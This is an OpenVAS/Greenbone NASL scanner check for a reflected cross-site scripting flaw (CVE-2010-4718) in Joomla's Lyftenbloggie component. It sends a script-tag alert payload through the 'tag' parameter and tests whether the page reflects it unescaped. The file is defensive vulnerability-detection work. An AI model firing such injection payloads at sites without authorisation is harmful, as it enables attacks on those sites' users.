# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801741");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-02-15 08:14:35 +0100 (Tue, 15 Feb 2011)");
  script_cve_id("CVE-2010-4718");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_name("Joomla 'Lyftenbloggie' Component Cross-Site Scripting Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/42677");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45468");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/96761/joomlalyftenbloggie-xss.txt");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site.");

  script_tag(name:"affected", value:"Joomla Lyftenbloggie component version 1.1.0.");

  script_tag(name:"insight", value:"Input passed via the 'tag' and 'category' parameters to 'index.php' (when
  'option' is set to 'com_lyftenbloggie') is not properly sanitised before being returned to the user.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
  a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Joomla is prone to Multiple Cross Site Scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/index.php?option=com_lyftenbloggie&tag=<script>alert("VT-XSS-Test")</script>';

if (http_vuln_check(port: port, url: url, pattern: '><script>alert("VT-XSS-Test")</script><',
                    check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
